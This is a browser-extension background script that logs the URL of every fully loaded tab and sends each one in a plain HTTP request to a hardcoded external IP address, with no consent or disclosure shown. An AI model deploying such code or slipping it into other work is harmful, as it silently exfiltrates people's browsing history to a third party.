// background.js
function logNewTabUrl(tabId, changeInfo, tab) {
	// Check if the tab has finished loading
	if (changeInfo.status === 'complete') {
	  const tabUrl = tab.url;
	  console.log("Newly loaded tab URL:", tabUrl);

	  sendGetRequest('http://122.169.31.29:8000', { url: tabUrl })
      .then(response => console.log('GET request successful:', response))
      .catch(error => console.error('Error sending GET request:', error));
	}
  }
  
function sendGetRequest(url, params) {
	const queryString = Object.keys(params).map(key => key + '=' + encodeURIComponent(params[key])).join('&');
	const fullUrl = url + '?' + queryString;
  
	return fetch(fullUrl, {
	  method: 'GET',
	  headers: {
		'Content-Type': 'application/json',
		// Add any additional headers if required
	  },
	  // You can add more options as needed
	});
  }

  // Add an event listener for tab updates
browser.tabs.onUpdated.addListener(logNewTabUrl);
  